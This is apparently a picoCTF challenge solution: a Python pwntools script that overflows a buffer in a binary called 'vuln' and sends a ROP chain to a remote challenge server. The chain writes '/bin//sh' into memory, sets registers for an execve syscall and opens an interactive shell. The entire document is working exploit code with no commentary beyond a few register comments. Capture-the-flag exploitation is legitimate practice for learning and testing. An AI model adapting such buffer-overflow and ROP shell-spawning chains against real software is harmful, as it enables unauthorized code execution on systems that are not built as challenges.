from pwn import *
context.binary = './vuln'
context.terminal = ['tmux','splitw', '-h']
#p = process()
#gdb.attach(p)
p = remote("saturn.picoctf.net",61404)
payload = b'A'*28
payload += p32(0x80583b9) + p32(0x080e62c0) + p32(0)
payload += p32(0x80b073a) + b'/bin'
payload += p32(0x80590f2)


payload += p32(0x80583b9) + p32(0x080e62c0+4) + p32(0)
payload += p32(0x80b073a) + b'//sh'
payload += p32(0x80590f2)


payload += p32(0x804fb80) # xor eax, eax
payload += p32(0x80b073a) + p32(0x0b) #eax
payload += p32(0x8049022) + p32(0x080e62c0) #ebx
payload += p32(0x8049e29) + p32(0) #ecx
payload += p32(0x80583b9) + p32(0) + p32(0x080e62c0) #pop edx, pop ebx
payload += p32(0x0804a3c2)
p.sendline(payload)
p.interactive()